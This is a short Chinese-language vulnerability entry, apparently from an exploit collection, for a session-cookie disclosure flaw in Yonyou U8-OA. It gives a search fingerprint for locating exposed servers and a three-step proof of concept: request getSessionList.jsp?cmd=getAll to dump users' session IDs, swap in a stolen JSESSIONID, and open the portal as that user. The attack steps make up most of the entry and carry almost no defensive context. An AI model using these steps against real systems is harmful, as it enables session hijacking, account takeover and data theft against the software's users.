# 用友U8OAgetSessionList.jsp用户cookie信息泄露漏洞

- **系统**：用友　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`"用友U8-OA"`

**请求体 / payload**
```
1. 执行POC读取用户cookie
/yyoa/ext/https/getSessionList.jsp?cmd=getAll
2. 获取SESSION之后访问：`/yyoa/common/js/menu/menu.jsp`，替换`Cookie`
JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXXX
3. 访问`/yyoa/portal/portalIndex.jsp`进入首页
```

**其他**
- 用友U8 OA getSessionList.jsp用户cookie信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 OA